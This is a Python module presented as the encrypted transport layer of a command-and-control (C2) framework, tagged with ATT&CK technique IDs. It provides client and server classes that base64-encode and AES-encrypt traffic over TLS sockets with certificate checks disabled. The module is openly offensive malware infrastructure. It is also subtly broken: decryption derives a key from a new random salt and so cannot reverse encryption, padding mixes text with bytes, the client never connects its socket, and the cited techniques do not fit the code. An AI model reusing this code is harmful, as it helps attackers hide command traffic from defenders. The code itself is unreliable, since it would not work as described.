"""
Encrypted Transport Layer for C2 Communication.

Provides encrypted transport layer for C2 communication between client and server.
ATT&CK techniques: T1059.003, T1059.004
"""

import base64
import hashlib
import os
import ssl
import socket
from typing import Optional, Tuple, Dict, Any


class CipherManager:
    """Manages cipher configurations and key derivation for encrypted transport."""

    def __init__(self, algorithm: str = "AES-256-CBC", key_length: int = 32):
        self.algorithm = algorithm
        self.key_length = key_length
        self._key_cache: Dict[str, bytes] = {}

    @staticmethod
    def derive_key(password: str, salt: Optional[bytes] = None) -> bytes:
        """Derive a cryptographic key from password using PBKDF2."""
        if not salt:
            salt = os.urandom(16)
        return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100_000, dklen=32)

    @staticmethod
    def derive_iv(key: bytes) -> bytes:
        """Derive initialization vector from key."""
        return hashlib.sha256(key).digest()[:16]

    def generate_session_key(self, password: str) -> Tuple[bytes, bytes]:
        """Generate a session key and IV for encryption/decryption."""
        salt = os.urandom(16)
        key = self.derive_key(password, salt)
        iv = self.derive_iv(key)
        return key, iv

    def encrypt(self, plaintext: str, password: str) -> bytes:
        """Encrypt plaintext using AES-CBC."""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend

        key, iv = self.generate_session_key(password)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded_plaintext = plaintext + (16 - len(plaintext) % 16) * b'\x00'
        return encryptor.update(padded_plaintext) + encryptor.finalize()

    def decrypt(self, ciphertext: bytes, password: str) -> str:
        """Decrypt ciphertext using AES-CBC."""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend

        key, iv = self.generate_session_key(password)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        return padded_plaintext.rstrip(b'\x00').decode('utf-8')


class EncryptedSocketTransport:
    """Encrypted transport layer for C2 communication using SSL/TLS and base64."""

    def __init__(self, host: str = "127.0.0.1", port: int = 443, password: str = "",
                 cipher_manager: Optional[CipherManager] = None):
        self.host = host
        self.port = port
        self.password = password
        self.cipher_manager = cipher_manager or CipherManager()
        self._socket: Optional[ssl.SSLSocket] = None
        self._connected = False

    def connect(self) -> ssl.SSLSocket:
        """Establish an encrypted connection to the server."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self._socket = context.wrap_socket(sock, server_hostname=self.host)
        self._connected = True
        return self._socket

    def disconnect(self) -> None:
        """Close the encrypted connection."""
        if self._socket and not self._socket.closed:
            self._socket.close()
        self._socket = None
        self._connected = False

    def send(self, payload: str) -> int:
        """Send an obfuscated (base64 encoded) message over the encrypted channel."""
        if not self._connected or not self._socket:
            raise ConnectionError("Not connected to server")
        try:
            encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
            data = self.cipher_manager.encrypt(encoded, self.password)
            self._socket.sendall(data)
            return len(data)
        except (BrokenPipeError, ConnectionResetError):
            raise

    def receive(self, buffer_size: int = 4096) -> str:
        """Receive and decode an obfuscated message from the encrypted channel."""
        if not self._connected or not self._socket:
            raise ConnectionError("Not connected to server")
        try:
            data = self._socket.recv(buffer_size)
            decrypted = self.cipher_manager.decrypt(data, self.password)
            decoded = base64.b64decode(decrypted).decode('utf-8')
            return decoded
        except (ConnectionResetError, ConnectionRefusedError):
            raise

    def send_raw(self, payload: bytes) -> int:
        """Send raw binary data over the encrypted channel."""
        if not self._connected or not self._socket:
            raise ConnectionError("Not connected to server")
        try:
            encoded = base64.b64encode(payload).decode('utf-8')
            data = self.cipher_manager.encrypt(encoded, self.password)
            self._socket.sendall(data)
            return len(data)
        except (BrokenPipeError, ConnectionResetError):
            raise

    def receive_raw(self, buffer_size: int = 4096) -> bytes:
        """Receive raw binary data from the encrypted channel."""
        if not self._connected or not self._socket:
            raise ConnectionError("Not connected to server")
        try:
            data = self._socket.recv(buffer_size)
            decrypted = self.cipher_manager.decrypt(data, self.password)
            decoded = base64.b64decode(decrypted)
            return decoded
        except (ConnectionResetError, ConnectionRefusedError):
            raise

    def is_connected(self) -> bool:
        """Check if the transport connection is active."""
        return self._connected and not (self._socket and self._socket.closed)


class EncryptedSocketTransportClient(EncryptedSocketTransport):
    """Client-side encrypted socket transport for C2 communication."""

    def __init__(self, host: str = "127.0.0.1", port: int = 443, password: str = "",
                 cipher_manager: Optional[CipherManager] = None):
        super().__init__(host=host, port=port, password=password, cipher_manager=cipher_manager)

    def connect(self) -> ssl.SSLSocket:
        """Establish an encrypted connection to the server."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self._socket = context.wrap_socket(sock, server_hostname=self.host)
        self._connected = True
        return self._socket


class EncryptedSocketTransportServer(EncryptedSocketTransport):
    """Server-side encrypted socket transport for C2 communication."""

    def __init__(self, host: str = "127.0.0.1", port: int = 443, password: str = "",
                 cipher_manager: Optional[CipherManager] = None):
        super().__init__(host=host, port=port, password=password, cipher_manager=cipher_manager)

    def listen(self) -> ssl.SSLSocket:
        """Start listening for encrypted connections."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(5)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self._socket = context.wrap_socket(sock, server_side=True)
        self._connected = True
        return self._socket

    def accept(self) -> Tuple[ssl.SSLSocket, socket.AddressInfo]:
        """Accept an incoming encrypted connection."""
        if not self._socket or self._socket.closed:
            raise ConnectionError("Server not listening")
        sock, addr = self._socket.accept()
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        encrypted_sock = context.wrap_socket(sock, server_side=True)
        return encrypted_sock, addr


__all__ = ["EncryptedSocketTransport", "CipherManager"]
